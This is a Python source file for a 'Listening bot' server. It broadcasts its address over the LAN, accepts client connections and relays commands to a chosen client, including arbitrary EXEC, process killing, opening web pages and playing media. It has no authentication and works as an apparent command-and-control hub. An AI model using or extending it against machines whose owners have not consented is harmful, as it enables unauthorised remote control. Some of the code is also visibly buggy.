from env import HELLOCLIENT_PORT, SERVER_PORT, SPLITTER, COMMANDS, CommandNamePermit
from packer import parsePackV1, Pack, CommandTypes, packV1, ContentTypes
from check_ips import IPV4
from typing import List, Any, Callable
from dataclasses import dataclass
from logger import info, logger
from threading import Thread
import socket
import shlex
import uuid
import time





class Client:
    def __init__(self, client: socket.socket, addr):
        self.is_running = True
        self._buffer = b''
        self.is_admin: bool = False
        self.custom_name: str = None
        self.description: str = None
        self.data: dict = {}
        self.uuid: str = None

        self.__on_close__: Callable = None
        

        self.client = client
        self.addr = addr
        self.client.settimeout(3)

        info(f"Client Join: " + str(addr))
        self.sendData("GetComputerInfo", ContentTypes.STR, None, None, None, None)



    def listening(self):
        
        while self.is_running:
            try:
                data = self.client.recv(1024)


                if not data:
                    break
                


                self._buffer += data



                while SPLITTER in self._buffer:
                    indexOf = self._buffer.index(SPLITTER)
                    _command = self._buffer[:indexOf]
                    self._buffer = self._buffer[indexOf + len(SPLITTER):]

                    command = parsePackV1(_command)


                    if not command:
                        raise Exception("parsePackV1 Error: ", _command)


                    self.onCommand(command)


            except TimeoutError:
                continue

            except Exception as ex:
                logger.error({
                    "addr": self.addr,
                    "ex": ex
                })
                break



        
        self.close()



    def onCommand(self, command: Pack):
        try:
            command_type = command.command_type or CommandTypes.COMMON_COMMAND


            if command_type == CommandTypes.COMMON_COMMAND:
                self.onCommonCommand(command)


            elif command_type == CommandTypes.SELECT_TARGET:
                self.onSelectTarget(command)


            elif command_type == CommandTypes.SERVER_COMMAND:
                self.onServerCommand(command)


            else:
                raise ModuleNotFoundError()
            

            # _command: CommandNamePermit = None


            # for row in COMMANDS:
            #     if row.command_name == command.name:
            #         _command = row
            #         break
            
            
            # if not _command:
            #     raise ModuleNotFoundError()
            


            # if command.name == "GetAllClient":
            #     pass


        except ModuleNotFoundError:
            logger.error("Client sent CommandType Not Found")
            pass


    def onServerCommand(self, command: Pack):
        

        if command.name == "ListClient":
            global server


            self.sendData("ClientList", ContentTypes.JSON, list(server.getAllClientUUID), command.ref_id, None)


        else:
            self.send404Command(command)



    def onSelectTarget(self, command: Pack):
        # print(command)

        _prefix_allowed = ['u']

        _tokens = shlex.split(command.data)
        _clients_selected: List[Client] = []
        _response = []
        _commands: List[str] = []


        if len(_tokens) == 0:
            self.sendErrorCommand(command, "tokens > 0 only")


        _select_token = _tokens[0]
        
        if _select_token not in _prefix_allowed:
            self.sendErrorCommand(command, "select token is not allow")


        # u     is user
        if _select_token == 'u':
            if not len(_tokens) > 2:
                self.sendErrorCommand(command, "select u token is more than 2 params")

            
            _user_uuid = _tokens[1]


            _client = server.findClientWithClientUUID(_user_uuid)


            if not _client:
                return self.sendErrorCommand(command, "not found client")


            _clients_selected.append(_client)

            _commands = _tokens[2:]


        else:
            pass
        
        
        print("=========================")
        print(_commands)

        if len(_commands) > 0:
            for _client in _clients_selected:
                first_command = _commands[0]
                data_command = _commands[1] if len(_commands) > 1 else ""



                if first_command == "TEST_SONG":
                    _client.sendData("TEST_SONG", ContentTypes.STR, "", command.ref_id, command.command_type, command.from_sender)


                elif first_command == "SET_SYSTEM_MUTE":
                    _client.sendData("SET_SYSTEM_MUTE", ContentTypes.JSON, {
                        "is_mute": data_command == "TRUE"
                    }, command.ref_id, command.command_type, command.from_sender)


                elif first_command == "SET_AUDIO_PERCEN":
                    _client.sendData("SET_AUDIO_PERCEN", ContentTypes.JSON, {
                        "percen": int(data_command)
                    }, command.ref_id, command.command_type, command.from_sender)


                elif first_command == "KILL_ALL":
                    _client.sendData("KILL_ALL", ContentTypes.STR, "", command.ref_id, command.command_type, command.from_sender)


                elif first_command == "FFPLAY_FROM":
                    _client.sendData("FFPLAY_FROM", ContentTypes.STR, data_command, command.ref_id, command.command_type, command.from_sender)


                elif first_command == "WEB_OPEN":
                    _client.sendData("WEB_OPEN", ContentTypes.STR, data_command, command.ref_id, command.command_type, command.from_sender)


                elif first_command == "EXEC":
                    _client.sendData("EXEC", ContentTypes.JSON, _commands[1:], command.ref_id, command.command_type, command.from_sender)     # ออกแบบ data_command ใหม่


                elif first_command == "KILL_PROC_WITH_NAME":
                    _client.sendData("KILL_PROC_WITH_NAME", ContentTypes.STR, data_command, command.ref_id, command.command_type, command.from_sender)


        # if True:
        #     pass


        # else:
        #     self.send404Command(command)


    def onCommonCommand(self, command: Pack):
        # print(command)


        if command.name == "ComputerInfo":
            self.data['ComputerInfo'] = command.data


        else:
            self.send404Command(command)



        print(self.data)





    def sendData(self, name: str, content_type: ContentTypes, body: Any, ref_id: str = None, command_type: CommandTypes = None, from_sender: str = None):
        if not self.client:
            return None
        

        self.client.sendall(packV1(name, content_type, body, ref_id, command_type, from_sender))
        return True
    


    def sendErrorCommand(self, command: Pack, detail: str = ""):
        self.sendData("500", ContentTypes.JSON, {
            "message": f"{command.name} not found format!",
            "detail": detail
        }, command.ref_id, command.command_type, command.from_sender)

    def send404Command(self, command: Pack):
        self.sendData("404", ContentTypes.JSON, {
            "message": f"{command.name} not found command"
        }, command.ref_id, command.command_type, command.from_sender)


    def close(self):
        if is_running:
            info(f"Client {self.addr} Disconnection")
            self._buffer = b''
            self.client.close()
            self.is_running = False


            if self.__on_close__:
                self.__on_close__()


    


    def setOnCloseCallback(self, on_close: Callable):
        self.__on_close__ = on_close


    def __del__(self):
        self.client.close()



@dataclass
class _Client:
    client: Client
    addr: Any
    task: Thread = None



class Server:
    def __init__(self):
        self.is_running = True

        self.clients: List[_Client] = []

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('', SERVER_PORT))
        self.server.listen(10)
        self.server.settimeout(5)



    def listening(self):
        info("Server Listening...")


        while self.is_running:
            try:
                __client, addr = self.server.accept()


                _client = Client(__client, addr)
                _client.uuid = self.getClientUUID
                _client.setOnCloseCallback(lambda: self.onClose(_client))

                client = _Client(_client, addr)
                
                task = Thread(target=_client.listening, args=())
                task.start()
                client.task = task

                self.clients.append(client)


            except TimeoutError:
                continue


            except Exception as ex:
                logger.error(ex)





        
        self.close()


    def onClose(self, client: Client):
        index = -1

        for i, _client in enumerate(self.clients):
            if _client.client.uuid == client.uuid:
                index = i
                break


        self.clients.pop(index)


    def close(self):
        if self.is_running:
            self.clients.clear()
            self.server.close()
            self.is_running = False


    def findClientWithClientUUID(self, client_uuid: str) -> Client | None:
        for client in self.clients:
            if client.client.uuid == client_uuid:
                return client.client
            

        return None


    @property
    def getAllClient(self):
        return map(lambda e: e.client, self.clients)
    

    @property
    def getAllClientUUID(self):
        return map(lambda e: e.uuid, self.getAllClient)
    

    @property
    def getClientUUID(self):
        while True:
            v4 = str(uuid.uuid4())

            if v4 not in self.getAllClientUUID:
                return v4
            





class HelloClient:
    def __init__(self):
        self.is_running = True


        self.server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)



    def broadcast(self):
        while self.is_running:
            info(f"Broadcast to everyone with {IPV4}")
            self.server.sendto(IPV4.encode(), ("<broadcast>", HELLOCLIENT_PORT))

            time.sleep(10)



    def close(self):
        if self.is_running:
            self.is_running = False




main_tasks = []
server: Server = None
hello_client: HelloClient = None

is_running = True




if __name__ == "__main__":
    info("Listening bot")
    info("Processes starting")

    info("Server TCP Starting")
    server = Server()

    task = Thread(target=server.listening, args=())
    task.start()
    main_tasks.append(task)
    info("Server TCP Started")


    info("HelloClient Server Starting")
    hello_client = HelloClient()

    task = Thread(target=hello_client.broadcast, args=())
    task.start()
    main_tasks.append(task)
    info("HelloClient Started")



    